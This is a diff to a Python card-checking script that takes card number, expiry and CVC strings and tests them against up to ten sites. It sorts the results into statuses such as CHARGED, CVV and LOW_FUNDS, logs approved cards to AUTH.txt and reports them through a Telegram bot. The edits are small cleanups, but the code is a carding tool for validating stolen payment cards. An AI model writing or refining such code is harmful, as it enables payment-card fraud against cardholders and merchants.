@@ -56,7 +56,6 @@ def process_single_card_for_site(card_data, headers, uuids, chat_id, bot_token, 
         return "DECLINED", msg, card_data
 
     try:
-        # Clean spaces around pipes then split
         cleaned = re.sub(r'\s*\|\s*', '|', card_data.strip())
         number, exp_month, exp_year, cvc = cleaned.split('|')
         if len(exp_year) == 4:
@@ -112,11 +111,10 @@ def process_single_card_for_site(card_data, headers, uuids, chat_id, bot_token, 
         text = confirm_resp.text
 
         if success:
-            message = f"AUTH {card_data}"
-            send_telegram_message(message, chat_id, bot_token)
+            # Removed sending "AUTH ..." message to avoid duplicates
             with open('AUTH.txt', 'a') as f:
                 f.write(f"{card_data}\n")
-            return "CHARGED", message, card_data
+            return "CHARGED", f"AUTH {card_data}", card_data
 
         if "Your card's security code is incorrect." in text:
             message = f"Incorrect CVC {card_data}"
@@ -142,10 +140,9 @@ def process_single_card_for_site(card_data, headers, uuids, chat_id, bot_token, 
         return "DECLINED", msg, card_data
 
 def check_card_across_sites(card_data, headers, uuids, chat_id, bot_token, sites):
-    for idx, site_url in enumerate(sites[:10], start=1):  # Limit to 10 sites max
+    for idx, site_url in enumerate(sites[:10], start=1):
         status, msg, raw = process_single_card_for_site(card_data, headers, uuids, chat_id, bot_token, site_url)
         if status in ["CHARGED", "CVV", "CCN", "LOW_FUNDS"]:
-            # Append site number to message
             msg += f"\nSite: {idx}"
             return status, msg, raw
     return "DECLINED", f"Declined on all sites: {card_data}", card_data
